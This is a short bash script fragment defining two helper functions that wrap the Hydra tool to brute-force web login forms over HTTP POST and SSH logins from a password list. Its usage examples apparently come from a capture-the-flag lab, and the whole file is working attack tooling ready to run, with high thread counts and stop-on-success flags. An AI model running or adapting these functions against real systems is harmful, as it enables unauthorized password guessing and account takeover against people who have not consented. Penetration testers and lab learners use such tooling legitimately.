# ========================
# hydra helpers
# ========================

hydraweb() {
  if [[ $# -lt 6 ]]; then
    echo "usage:"
    echo "  hydraweb <target> <path> <user> <F|S> <text> <user_field> [pass_field] [extra_post]"
    echo
    echo "examples:"
    echo "  hydraweb 10.10.10.10 /login.php Rick F \"Invalid username or password\" username password"
    echo "  hydraweb 10.10.10.10 /login.php R1ckR0n43 S \"ingredient\" username password \"sub=Login\""
    echo
    echo "extra_post default: sub=Login  (matches login.php submit button)"
    return 1
  fi

  local target="$1"
  local path="$2"
  local user="$3"
  local mode="$4"
  local text="$5"
  local userfield="$6"
  local passfield="${7:-password}"
  local extra_post="${8:-sub=Login}"

  local form="${path}:${userfield}=^USER^&${passfield}=^PASS^"
  if [[ -n "$extra_post" ]]; then
    form="${form}&${extra_post}"
  fi
  form="${form}:${mode}=${text}"

  echo "[*] hydra form: ${form}"

  /usr/bin/hydra -l "$user" \
    -P "$RECON_PASSLIST" \
    -t 16 -f -V \
    "$target" http-post-form \
    "$form"
}

hydrassh() {
  if [[ $# -lt 2 ]]; then
    echo "usage: hydrassh <target> <user>"
    return 1
  fi

  hydra -l "$2" \
    -P "$RECON_PASSLIST" \
    -t 32 -f -V \
    ssh://"$1"
}
